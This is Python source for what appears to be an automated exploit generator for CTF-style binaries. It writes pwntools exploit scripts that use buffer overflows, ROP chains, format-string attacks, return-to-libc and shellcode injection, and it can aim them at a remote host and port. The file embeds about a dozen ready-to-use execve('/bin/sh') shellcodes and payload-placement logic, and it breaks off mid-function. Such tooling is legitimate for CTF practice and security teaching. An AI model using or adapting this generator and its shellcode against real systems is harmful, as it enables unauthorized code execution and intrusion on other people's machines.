#!/usr/bin/env python3

import os
import pickle
import subprocess
import shutil
import math
import edge

from pwn import *

'''
+-----------------------------------------------------------+
|                        Classes                            |
+-----------------------------------------------------------+
'''

class PayloadParts():
	def __init__(self):
		self.start = None
		self.parts = None
		self.ret_address = None
		self.rop_chain = None
		self.default_byte = None

	def set_ret(self, ret_address):
		self.ret_address = ret_address

	def set_rop_chain(self, rop_chain):
		self.rop_chain = rop_chain

	def set_default_byte(self, default_byte):
		self.default_byte = default_byte

	def construct_payload(self, elf, exploit_name, send_line=True):
		start = self.start

		exploit_write('bof_payload.set_input_start(%s)' % hex(start), exploit_name)


		payload_componets = self.parts
		for part in payload_componets:
			offset = part.offset
			value = part.value
			if part.type == int:
				if part.region is None:
					if part.size == 4:
						exploit_write("bof_payload.add_int32(%s, %s)" % (hex(offset), hex(value)), exploit_name)
					elif part.size == 8:
						exploit_write("bof_payload.add_int64(%s, %s)" % (hex(offset), hex(value)), exploit_name)
				else:
					if part.size == 4:
						exploit_write('bof_payload.add_int32(%s, %s, "%s")' % (hex(offset), hex(value), part.region), exploit_name)
					elif part.size == 8:
						exploit_write('bof_payload.add_int64(%s, %s, "%s")' % (hex(offset), hex(value), part.region), exploit_name)				

			if part.type == bytes:
				exploit_write('bof_payload.add_bytes(%s, b"%s")' % (hex(part.offset), part.value), exploit_name)

		if self.default_byte:
			exploit_write('bof_payload.set_default_byte(b"\\x%s")' % hex(self.default_byte)[2:], exploit_name)

		ret_addr = self.ret_address

		if isinstance(ret_addr, int):
			exploit_write("bof_payload.set_ret(%s)" % hex(ret_addr), exploit_name)
		elif isinstance(ret_addr, list):
			if len(ret_addr) == 2:
				if isinstance(ret_addr[0], int) and isinstance(ret_addr[1], str):
					exploit_write('bof_payload.set_ret(%s, "%s")' % (hex(ret_addr[0]), ret_addr[1]), exploit_name)

		elif self.rop_chain != None:
			exploit_write("rop_chain = %s" % str(self.rop_chain), exploit_name)
			exploit_write("bof_payload.add_rop_chain(rop_chain)", exploit_name)

		exploit_write("payload = bof_payload.generate_payload()", exploit_name)
		if send_line:
			exploit_write("target.sendline(payload)", exploit_name)

	def construct_payload_argv(self, elf, elf_name, attack_name, count=None):
		if isinstance(count, int):
			exploit_name = get_single_exploit_name("%s-%d" % (attack_name, count))
		else:
			exploit_name = get_single_exploit_name("%s" % (attack_name))		

		exploit_write('from pwn import *\n\n', exploit_name)
		exploit_write('import sf\n', exploit_name)
		exploit_write("import time\n\n", exploit_name)
		if elf.arch == "amd64":
			exploit_write('bof_payload = sf.BufferOverflow(arch=64)\n\n', exploit_name)
		elif elf.arch == "i386":
			exploit_write('bof_payload = sf.BufferOverflow(arch=32)\n\n', exploit_name)

		self.construct_payload(elf, exploit_name, False)

		exploit_write('\npayload = payload.replace(b"\\x00", b"")\n', exploit_name)
		exploit_write('\ntarget = process(["./%s", payload])\n' % (elf_name), exploit_name)

		exploit_write('\n%s' % VERIFICATION_START_STRING, exploit_name)
		exploit_write('limit = 0', exploit_name)
		exploit_write('j = 0', exploit_name)
		exploit_write('while limit < 5:', exploit_name)
		exploit_write('\ttry:', exploit_name)
		exploit_write('\t\ttarget.sendline("echo flag{")', exploit_name)
		exploit_write('\texcept:', exploit_name)
		exploit_write('\t\tprint("Could not send data")', exploit_name)
		exploit_write('\tlimit += 1', exploit_name)
		exploit_write('\ttry:', exploit_name)
		exploit_write('\t\toutput = "A good..."', exploit_name)
		exploit_write('\t\twhile output != "" and j < 200:', exploit_name)
		exploit_write("\t\t\toutput = target.recv(1, timeout=.1)", exploit_name)
		exploit_write('\t\t\tprint(output.decode("utf-8"))', exploit_name)
		exploit_write('\t\t\tj += 1', exploit_name)
		exploit_write('\texcept:', exploit_name)
		exploit_write('\t\tprint(output)', exploit_name)

		return exploit_name

class Part():
	def __init__(self):
		self.type = None
		self.region = None
		self.value = None
		self.offset = None
		self.size = None

class StackVuln():
	def __init__(self, stack_vuln_dict):
		if not isinstance(stack_vuln_dict, dict):
			raise TypeError("Input should be dictionary")
		self.address = stack_vuln_dict["address"]
		self.type = stack_vuln_dict["type"]
		self.write_size = stack_vuln_dict["writeSize"]
		self.inp_type = stack_vuln_dict["inpType"]
		self.checks = stack_vuln_dict["checks"]
		self.calling_function = stack_vuln_dict["callingFunction"]
		self.function = stack_vuln_dict["function"]
		self.called_ptrs = stack_vuln_dict["calledPtrs"]
		self.overwriteable_vars = stack_vuln_dict["overwriteableVars"]
		self.offset = self.overwriteable_vars[0]

class InfoleakVuln():
	def __init__(self, infoleak_vuln_dict):
		if not isinstance(infoleak_vuln_dict, dict):
			raise TypeError("Input should be dictionary")

		self.address = infoleak_vuln_dict["address"]
		self.memory_region = infoleak_vuln_dict["memoryRegion"]
		self.offset = infoleak_vuln_dict["offset"]
		self.fmt_index = infoleak_vuln_dict["fmtIndex"]
		self.string = infoleak_vuln_dict["string"]
		self.calling_function = infoleak_vuln_dict["callingFunction"]
		self.function = infoleak_vuln_dict["function"]


class CallInputVuln():
	def __init__(self, callinput_vuln_dict):
		if not isinstance(callinput_vuln_dict, dict):
			raise TypeError("Input should be dictionary")

		self.address = callinput_vuln_dict["address"]
		self.offset = callinput_vuln_dict["offset"]
		self.inp_num = callinput_vuln_dict["inpNum"]
		self.calling_function = callinput_vuln_dict["callingFunction"]
		self.function = callinput_vuln_dict["function"]

class Input():
	def __init__(self, input_vuln_dict):
		if not isinstance(input_vuln_dict, dict):
			raise TypeError("Input should be dictionary")

		self.address = input_vuln_dict["address"]
		self.offset = input_vuln_dict["stackOffset"]
		self.inp_type = input_vuln_dict["inpType"]
		self.write_size = input_vuln_dict["writeSize"]
		self.checks = input_vuln_dict["checks"]
		self.calling_function = input_vuln_dict["callingFunction"]
		self.function = input_vuln_dict["function"]
		self.called_ptrs = input_vuln_dict["calledPtrs"]

class FmtStringVuln():
	def __init__(self, fmt_string_vuln_dict):
		self.address = fmt_string_vuln_dict["address"]
		self.stack_offset = fmt_string_vuln_dict["stackOffset"]
		self.inp_method = fmt_string_vuln_dict["inpMethod"]
		self.calling_function = fmt_string_vuln_dict["callingFunction"]
		self.function = fmt_string_vuln_dict["function"]

'''
+-----------------------------------------------------------+
|                     Constants                             |
+-----------------------------------------------------------+
'''

BIN_SH_STRINGS = [b"/bin/sh", b"/bin/bash"]

INSTALL_DIR = "/Hackery/remenissions/"

ROPGADGET_DIR = "%sdependencies/ropgadget/" % INSTALL_DIR

THE_NIGHT_LIBCS = "%sdependencies/The_Night/libcs/" % INSTALL_DIR

WIN_FILE = "pwned"
LOOSE_FILE = "rip"

EXECUTE_STRING = "gdbscript"
#EXECUTE_STRING = "execute"

VERIFICATION_START_STRING = "# Exploit Verification starts here 15935728"

LIBC_EXPLOITS_DIRECTORY_NAME = "libcExploits"

DYNAMIC_ANALYZER_NAME = "diamond_eyes.py"

BOF_VAR_PROMPT = ["Overwrite Variables", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/04-bof_variable"]

BOF_FUNC_PROMPT = ["Bof Win Function", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/05-bof_callfunction"]
BOF_FUNC_ARGV_PROMPT = ["Bof Win Function Argv", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/05-bof_callfunction"]
BOF_FUNC_INFOLEAK_PROMPT = ["Bof Win Function Infoleak", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/05-bof_callfunction"]
BOF_FUNC_SYSTEM_PROMPT = ["Bof System", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/05-bof_callfunction"]
BOF_FUNC_SYSTEM_INFOLEAK_PROMPT = ["Bof System Infoleak", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/05-bof_callfunction"]

BOF_SHELLCODE_PROMPT = ["Bof Shellcode", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/06-bof_shellcode"]

INDR_CALL_PROMPT = ["Indirect Call", "https://github.com/guyinatuxedo/nightmare"]
INDR_CALL_PIE_PROMPT = ["Indirect Call Pie", "https://github.com/guyinatuxedo/nightmare"]
INDR_CALL_LIBC_PROMPT = ["Indirect Call Libc", "https://github.com/guyinatuxedo/nightmare"]
INDR_CALL_SHELLCODE_PROMPT = ["Indirect Call Shellcode", "https://github.com/guyinatuxedo/nightmare"]

CALL_INPUT_PROMPT = ["Call Input", "https://github.com/guyinatuxedo/nightmare"]

BOF_STATIC_PROMPT = ["Bof Static", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static"]

RET_2_LIBC_PROMPT = ["Return to Libc", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static"]
RET_2_LIBC_PUTS_INFOLEAK_PROMPT = ["Return to Libc Puts Infoleak", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic"]
LIBC_ID_PROMPT = ["Libc ID Return to Libc", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic"]

FMT_STRING_WINFUNC_PROMPT = ["Format String Winfunc", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_WINFUNC_PIE_PROMPT = ["Format String Winfunc Pie", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_WINFUNC_PIE_FSLEAK_PROMPT = ["Format String Winfunc Pie FsLeak", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_SYSTEM_PROMPT = ["Format String GOT System", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_SYSTEM_PIE_PROMPT = ["Format String GOT System Pie", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_RET_WINFUNC_PROMPT = ["Format String Ret Winfunc", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_RET_SHELLCODE_PROMPT = ["Format String Ret Shellcode", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_SHELLCODE_PROMPT = ["Format String GOT Shellcode", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_SHELLCODE_FSLEAK_PROMPT = ["Format String GOT Shellcode Fsleak", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_LIBC_PROMPT = ["Format String GOT Libc", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_LIBC_FSLEAK_PROMPT = ["Format String GOT Libc FsLeak", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]
FMT_STRING_GOT_ONESHOT_PROMPT = ["Format String GOT Oneshot", "https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings"]



VERIFIED_EXPLOIT_EDGE = "# +------------------------------------------------+\n"
VERIFIED_EXPLOIT_BEGIN = "# | Atack: "
VERIFIED_EXPLOIT_END = "|\n"
VERIFIED_EXPLOIT_EXPLANATION = "#\n# For more info checkout: "

VERIFIED_EXPLOITS_PROMPT = {
							"BofVar": BOF_VAR_PROMPT,

							"BofFuncArgv": BOF_FUNC_ARGV_PROMPT,
							"BofFuncWInfoleak": BOF_FUNC_INFOLEAK_PROMPT,
							"BofSystemWInfoleak": BOF_FUNC_SYSTEM_INFOLEAK_PROMPT,
							"BofFunc": BOF_FUNC_PROMPT,
							"BofSystem": BOF_FUNC_SYSTEM_PROMPT,							

							"BofShellcode": BOF_SHELLCODE_PROMPT,

							"IndrCallPie": INDR_CALL_PIE_PROMPT,
							"IndrCallLibc": INDR_CALL_LIBC_PROMPT,
							"IndrCallShellcode": INDR_CALL_SHELLCODE_PROMPT,
							"IndrCall": INDR_CALL_PROMPT,

							"CallInput": CALL_INPUT_PROMPT,

							"BofStatic": BOF_STATIC_PROMPT,

							"Ret2LibcPutsInfoleak": RET_2_LIBC_PUTS_INFOLEAK_PROMPT,

							"Ret2LibcId": LIBC_ID_PROMPT,
							"Ret2Libc": RET_2_LIBC_PROMPT,

							"FsGotWinFuncPieFsleak": FMT_STRING_WINFUNC_PIE_FSLEAK_PROMPT,
							"FsGotWinFuncPie": FMT_STRING_WINFUNC_PIE_PROMPT,
							"FsGotWinFunc": FMT_STRING_WINFUNC_PROMPT,

							"FsGotSystemPie": FMT_STRING_GOT_SYSTEM_PIE_PROMPT,
							"FsGotSystem": FMT_STRING_GOT_SYSTEM_PROMPT,
							"FsRetWinFunc": FMT_STRING_RET_WINFUNC_PROMPT,
							"FsGotShellcodeFsleak": FMT_STRING_GOT_SHELLCODE_FSLEAK_PROMPT,							
							"FsRetShellcode": FMT_STRING_RET_SHELLCODE_PROMPT,
							"FsGotShellcode": FMT_STRING_GOT_SHELLCODE_PROMPT,
							"FsGotLibcFsleakLoop": FMT_STRING_GOT_LIBC_FSLEAK_PROMPT,
							"FsGotLibc": FMT_STRING_GOT_LIBC_PROMPT,
							"FsGotOneshot": FMT_STRING_GOT_ONESHOT_PROMPT
						}

'''
+-----------------------------------------------------------+
|            Exploit File Handling                          |
+-----------------------------------------------------------+
'''
def get_single_exploit_name(name):
	return "exploit-%s.py" % name


def setup_exploit(elf_name, elf, attack_name, verification = None):
	exploit_name = get_single_exploit_name(attack_name)
	exploit = open(exploit_name, "w")
	exploit.write('from pwn import *\n\n')
	exploit.write("import os\n")
	exploit.write("import sf\n")
	exploit.write("import sys\n")
	exploit.write("import signal\n\n")
	exploit.write('target = process("./%s")\n' % elf_name)
	if verification == None:
		exploit.write('gdb.attach(target, %s="verify_exploit")\n\n' % EXECUTE_STRING)

	elif verification == "static":
		exploit.write('gdb.attach(target, %s="verify_exploit_static")\n\n' % EXECUTE_STRING)

	if elf.arch == "amd64":
		exploit.write('bof_payload = sf.BufferOverflow(arch=64)\n\n')
	elif elf.arch == "i386":
		exploit.write('bof_payload = sf.BufferOverflow(arch=32)\n\n')
	exploit.write('')		
	exploit.close()
	return exploit_name

def setup_libc_exploit(elf, elf_name, libc_name, attack_name):
	exploit_name = get_single_exploit_name(attack_name)
	exploit = open(exploit_name, "w")
	exploit.write('from pwn import *\n\n')
	exploit.write("import os\n")
	exploit.write("import sf\n")
	exploit.write("import sys\n")
	exploit.write("import signal\n\n")
	exploit.write('target = process("./%s", env={"LD_PRELOAD":"./%s"})\n' % (elf_name, libc_name))
	exploit.write('gdb.attach(target, %s="verify_exploit")\n' % EXECUTE_STRING)

	if elf.arch == "amd64":
		exploit.write('bof_payload = sf.BufferOverflow(arch=64)\n\n')
	elif elf.arch == "i386":
		exploit.write('bof_payload = sf.BufferOverflow(arch=32)\n\n')

	exploit.close()
	return exploit_name

def setup_filler_exploit(elf_name, elf, libc_name):
	exploit_name = 'binded-in-chains.py'
	exploit = open(exploit_name, "w")
	exploit.write('from pwn import *\n\n')
	exploit.write("import sf\n")
	if elf.arch == "amd64":
		exploit.write("import time\n\n")
	exploit.write("import sys\n\n")
	if libc_name != None:
		exploit.write('target = process("./%s", env={"LD_PRELOAD":"./%s"})\n' % (elf_name, libc_name))
	else:
		exploit.write('target = process("./%s")\n' % elf_name)		
	exploit.write('gdb.attach(target, %s="get_libc_puts_address")\n\n' % EXECUTE_STRING)	
	if elf.arch == "amd64":
		exploit.write('bof_payload = sf.BufferOverflow(arch=64)\n\n')
	elif elf.arch == "i386":
		exploit.write('bof_payload = sf.BufferOverflow(arch=32)\n\n')

	exploit.close()
	return exploit_name

def setup_id_exploit(elf_name, elf, ip_port):
	exploit_name = 'afterlife.py'
	exploit = open(exploit_name, "w")
	exploit.write('from pwn import *\n\n')
	exploit.write('import sf\n\n')
	exploit.write('import thenight\n\n')
	if elf.arch == "amd64":
		exploit.write("import time\n\n")
	exploit.write("import sys\n\n")
	if ip_port != None:
		exploit.write('target = remote("%s", %s)\n' % (ip_port[0], ip_port[1]))
	else:
		exploit.write('target = process("./%s")\n' % elf_name)
	if elf.arch == "amd64":
		exploit.write('bof_payload = sf.BufferOverflow(arch=64)\n\n')
	elif elf.arch == "i386":
		exploit.write('bof_payload = sf.BufferOverflow(arch=32)\n\n')
	exploit.close()
	return exploit_name


def multi_setup_exploit(elf_name, elf, attack_name):
	exploit_name = get_single_exploit_name(attack_name)
	if os.path.exists(exploit_name):
		os.remove(exploit_name)
		
	exploit = open(exploit_name, "w")
	exploit.write('from pwn import *\n')
	exploit.write("import time\n")
	exploit.write("import sys\n")
	exploit.write("import signal\n")
	exploit.write("import sf\n\n")
	exploit.write('target = process("./%s")\n' % elf_name)
	exploit.write('gdb.attach(target, %s="verify_exploit")\n\n' % EXECUTE_STRING)
	if elf.arch == "amd64":
		exploit.write('bof_payload = sf.BufferOverflow(arch=64)\n\n')
	elif elf.arch == "i386":
		exploit.write('bof_payload = sf.BufferOverflow(arch=32)\n\n')
	exploit.close()

	return exploit_name

def write_crash_detection(exploit_name):
	exploit = open(exploit_name, "a")
	exploit.write("\n# Exploit Verification starts here 15935728\n\n")

	exploit.write("def handler(signum, frame):\n")
	exploit.write('\traise Exception("Timed out")\n\n')

	exploit.write("def check_verification_done():\n")
	exploit.write("\twhile True:\n")
	exploit.write('\t\tif os.path.exists("pwned") or os.path.exists("rip"):\n')
	exploit.write('\t\t\tsys.exit(0)\n\n')

	exploit.write("signal.signal(signal.SIGALRM, handler)\n")
	exploit.write("signal.alarm(2)\n\n")

	exploit.write("try:\n")
	exploit.write("\twhile True:\n")
	exploit.write('\t\tcheck_verification_done()\n')
	exploit.write('except Exception:\n')
	exploit.write('\tprint("Exploit timed out")\n')
	exploit.close()

def write_crash_detection_libc(exploit_name):
	exploit = open(exploit_name, "a")
	exploit.write("\n# Exploit Verification starts here 15935728\n\n")

	exploit.write("time.sleep(.5)\n")
	exploit.close()

def exploit_write(inp, exploit_name):
	exploit = open(exploit_name, "a")
	exploit.write('%s\n' % inp)
	exploit.close() 

def write_verified_prompt(exploit_file, exploit_name):
	for attack_type in VERIFIED_EXPLOITS_PROMPT.keys():
		if attack_type in exploit_name:
			exploit_prompt = VERIFIED_EXPLOITS_PROMPT[attack_type]
			attack_name = exploit_prompt[0]
			attack_explanation = exploit_prompt[1]
			exploit_file.write(VERIFIED_EXPLOIT_EDGE)
			exploit_file.write(VERIFIED_EXPLOIT_BEGIN)
			exploit_file.write(attack_name)
			exploit_file.write(" " * (51 - len(VERIFIED_EXPLOIT_BEGIN + attack_name)))
			exploit_file.write(VERIFIED_EXPLOIT_END)
			exploit_file.write(VERIFIED_EXPLOIT_EDGE)
			exploit_file.write(VERIFIED_EXPLOIT_EXPLANATION)
			exploit_file.write(attack_explanation)
			exploit_file.write("\n\n")

def write_win_prompt(exploit_file):
	win_prompt = edge.get_edge()
	exploit_file.write("\n%s\n" % win_prompt)

def finalize_exploit(exploit_name, ip_port, normie):
	final_exploit_name = "verified-%s" % exploit_name
	testedExploit = open(exploit_name, "r")
	exploit = open(final_exploit_name, "w")
	write_verified_prompt(exploit, exploit_name)
	for line in testedExploit:
		if line[:3] == "gdb" and ip_port == None:
			exploit.write(line.split(',')[0] + ")\n")
			continue
		if 'process("./' in line and ip_port != None:
			exploit.write('target = remote("%s", %s)\n' % (ip_port[0], ip_port[1]))
			exploit.write('#%s' % line)
			continue
		if "gdb" in line and ip_port != None:
			exploit.write("#%s\n" % line.split(',')[0])
			continue
		elif VERIFICATION_START_STRING in line:
			exploit.write("\ntarget.interactive()\n")
			break			
		if ("import os" in line) or ("import signal" in line) or ("import sys" in line):
			continue
		else:
			exploit.write(f"{line}")

	if normie:
		write_win_prompt(exploit)

	exploit.close()
	shutil.copyfile(final_exploit_name, "../%s" % final_exploit_name)

def finalize_argv_exploit(exploit_name):
	final_exploit_name = "verified-%s" % exploit_name
	testedExploit = open(exploit_name, "r")
	exploit = open(final_exploit_name, "w")
	write_verified_prompt(exploit, exploit_name)
	for line in testedExploit:
		if "15935728" in line:
			exploit.write("\ntarget.interactive()\n")
			break
		else:
			exploit.write(f"{line}")

	write_win_prompt(exploit)
	exploit.close()
	shutil.copyfile(final_exploit_name, "../%s" % final_exploit_name)

'''
+-----------------------------------------------------------+
|            Shecllcode                                     |
+-----------------------------------------------------------+
'''

# This is where we define the various shellcodes to use
# I did not write any of these, I commented the source where I got them

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-806.php
SHELLCODE64_0 = "\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"
SHELLCODE_LEN64_0 = 27

# This shellcode is from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
SHELLCODE64_1 = "\\x31\\xf6\\x48\\xbf\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdf\\xf7\\xe6\\x04\\x3b\\x57\\x54\\x5f\\x0f\\x05"
SHELLCODE_LEN64_1 = 24

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-603.php
SHELLCODE64_2 = "\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05"
SHELLCODE_LEN64_2 = 30

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-905.php
SHELLCODE64_3 = "\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05"
SHELLCODE_LEN64_3 = 29

# Borrowed from pwntools
SHELLCODE_SCANF_64 = "\\x6a\\x68\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x73\\x50\\x48\\x89\\xe7\\x68\\x72\\x69\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x31\\xf6\\x56\\x6a\\x08\\x5e\\x48\\x01\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05"
SHELLCODE_SCANF_64Len = 48

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php
SHELLCODE32_0    = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
SHELLCODE_Len32_0 = 23

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-811.php
SHELLCODE32_1 = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
SHELLCODE_Len32_1 = 28

# This shellcode is: http://shell-storm.org/shellcode/files/shellcode-491.php
SHELLCODE32_2 = "\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x32\\x80\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\\x32\\xc1\\x51\\x69\\x30\\x30\\x74\\x69\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x51\\x54\\x8a\\xe2\\x9a\\xb1\\x0c\\xce\\x81"
SHELLCODE_Len32_2 = 40

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-606.php
SHELLCODE32_3 = "\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80"
SHELLCODE_Len32_3 = 33

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-251.php
SHELLCODE32_4 = "\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x6a\\x2e\\x58\\x53\\xcd\\x80\\x31\\xd2\\x6a\\x0b\\x58\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80"
SHELLCODE_Len32_4 = 37

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-250.php
SHELLCODE32_5 = "\\x6a\\x46\\x58\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x31\\xd2\\x6a\\x0b\\x58\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80"
SHELLCODE_Len32_5 = 33

# Borrorwed from https://gbmaster.wordpress.com/2014/07/01/x86-exploitation-101-born-in-a-shell/
SHELLCODE_SCANF_32 = "\\x83\\xec\\x7f\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x04\\x05\\x04\\x06\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80"
SHELLCODE_SCANF_32Len = 36

# Define the shellcode collections, and the base shellcodes

SHELLCODES64 = [
	[SHELLCODE64_0, SHELLCODE_LEN64_0],
	[SHELLCODE64_1, SHELLCODE_LEN64_1],
	[SHELLCODE64_2, SHELLCODE_LEN64_2],
	[SHELLCODE64_3, SHELLCODE_LEN64_3],
	[SHELLCODE_SCANF_64, SHELLCODE_SCANF_64Len]
]

SHELLCODES32 = [
  [SHELLCODE_SCANF_32, SHELLCODE_SCANF_32Len],
  [SHELLCODE32_0, SHELLCODE_Len32_0],
  [SHELLCODE32_1, SHELLCODE_Len32_1],
  [SHELLCODE32_2, SHELLCODE_Len32_2],
  [SHELLCODE32_3, SHELLCODE_Len32_3],
  [SHELLCODE32_4, SHELLCODE_Len32_4],
  [SHELLCODE32_5, SHELLCODE_Len32_5]
]

BASE_Shellcode64 = SHELLCODE64_1
BASE_SHELLCODE_LEN64 = SHELLCODE_LEN64_1

BASE_SHELLCODE32 = SHELLCODE_SCANF_32
BASE_SHELLCODE_LEN32 = SHELLCODE_SCANF_32Len

def get_shellcode(elf, stack_vuln):
	input_function = stack_vuln.function

	if input_function is None or "scanf" not in input_function:
		if elf.arch == "i386":
			return BASE_SHELLCODE32, BASE_SHELLCODE_LEN32

		elif elf.arch == "amd64":
			return BASE_Shellcode64, BASE_SHELLCODE_LEN64
	else:
		if elf.arch == "i386":
			return SHELLCODE_SCANF_32, SHELLCODE_SCANF_32Len

		elif elf.arch == "amd64":
			return SHELLCODE_SCANF_64, SHELLCODE_SCANF_64Len

def get_all_shellcode(elf, stack_vuln):
	if elf.arch == "i386":
		return SHELLCODES32 
	elif elf.arch == "amd64":
		return SHELLCODES64

def add_shellcode(payload_parts, shellcode, offset):
	shellcode_part = Part()
	shellcode_part.type = bytes
	shellcode_part.region = None
	shellcode_part.offset = offset
	shellcode_part.value = shellcode

	payload_parts.parts.append(shellcode_part)

	payload_parts.ret_address = [-offset, "stack"]

def can_place_shellcode_between_cmps(stack_vuln, data_len):
	checks = stack_vuln.checks
	totalSpace = stack_vuln.overwriteable_vars[0]

	if type(totalSpace) == str:
		return offsets

	if len(checks) == 0:
		if totalSpace > data_len:
			return True, totalSpace

	for i in range(0, len(checks)):
		checkSize = checks[i]["size"]
		offset = (totalSpace - checks[i]["stackOffset"])
		if (offset + checkSize) > totalSpace:
			break

		if offset >= data_len:
			return True, totalSpace
		totalSpace = totalSpace - (offset + checkSize)

	if totalSpace >= data_len:
		return True, totalSpace

	return False, 0


def can_place_shellcode_after_return_address(stack_vuln, data_len, elf):
	if stack_vuln == None:
		return True
	writeable_bytes_after_return_address = stack_vuln.write_size
	ptr_size = get_arch_int_size(elf)
	if writeable_bytes_after_return_address == None:
		return True
	if (writeable_bytes_after_return_address > (data_len + ptr_size)):
		return True
	return False

def place_shellcode_indr_call(elf, stack_vuln, data, data_len):
	prep_stack_vuln(stack_vuln)
	strip_repeated_checks(stack_vuln)

	checks = stack_vuln.checks
	checks = strip_ret_address_checks(checks)
	
	shellcode_betwen_cmps, offset_index = can_place_shellcode_between_cmps(stack_vuln, data_len)

	shellcodeAfterRet = False
	if shellcode_betwen_cmps == False:
		shellcodeAfterRet = can_place_shellcode_after_return_address(stack_vuln, data_len, elf)

	ptr = stack_vuln.called_ptrs[0]

	# Place shellcode on stack before return address, between stack variables used in cmps
	if shellcode_betwen_cmps == True or shellcodeAfterRet == True:
		
		if shellcode_betwen_cmps == True:
			stack_vuln = prep_indirect_call(elf, stack_vuln, -1*offset_index, ptr, "stack")
			payload_parts = payload_parts_generator(elf, stack_vuln)
			add_shellcode(payload_parts, data, offset_index)

		else:			
			stack_vuln = prep_indirect_call(elf, stack_vuln, get_arch_int_size(elf), ptr, "stack")
			payload_parts = payload_parts_generator(elf, stack_vuln)			
			add_shellcode(payload_parts, data, -1*get_arch_int_size(elf))

	else:
		payload_parts = None

	return payload_parts

def placeShellcode(elf, stack_vuln, data, data_len):
	prep_stack_vuln(stack_vuln)
	strip_repeated_checks(stack_vuln)

	checks = stack_vuln.checks
	checks = strip_ret_address_checks(checks)
	
	shellcode_betwen_cmps, offset_index = can_place_shellcode_between_cmps(stack_vuln, data_len)

	shellcodeAfterRet = False
	if shellcode_betwen_cmps == False:
		shellcodeAfterRet = can_place_shellcode_after_return_address(stack_vuln, data_len, elf)

	# Place shellcode on stack before return address, between stack variables used in cmps
